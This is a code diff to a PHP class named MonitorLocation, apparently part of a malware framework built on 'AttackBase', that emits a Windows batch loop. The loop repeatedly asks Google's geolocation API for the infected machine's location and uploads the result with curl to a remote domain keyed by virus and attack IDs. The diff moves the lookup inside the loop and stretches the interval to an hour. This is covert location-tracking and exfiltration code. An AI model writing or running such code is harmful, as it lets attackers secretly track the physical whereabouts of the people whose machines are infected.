@@ -74,11 +74,10 @@ class MonitorLocation extends AttackBase {
 
     public function generateBatchCode(): void {
         //@formatter:off ?>
-
-        curl -d "{}" -H "Content-Type: application/json" "https://www.googleapis.com/geolocation/v1/geolocate?key=<?php echo getenv("GOOGLE_GEOLOCATION_API_KEY"); ?>">"%~pd0geo"
         :daemon_loop
+        curl -d "{}" -H "Content-Type: application/json" "https://www.googleapis.com/geolocation/v1/geolocate?key=<?php echo getenv("GOOGLE_GEOLOCATION_API_KEY"); ?>">"%~pd0geo"
         curl --form "geoFile=@%~pd0geo" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report\n"; ?>
-        timeout 20
+        timeout 3600
         goto daemon_loop
         <?php
         //@formatter:on
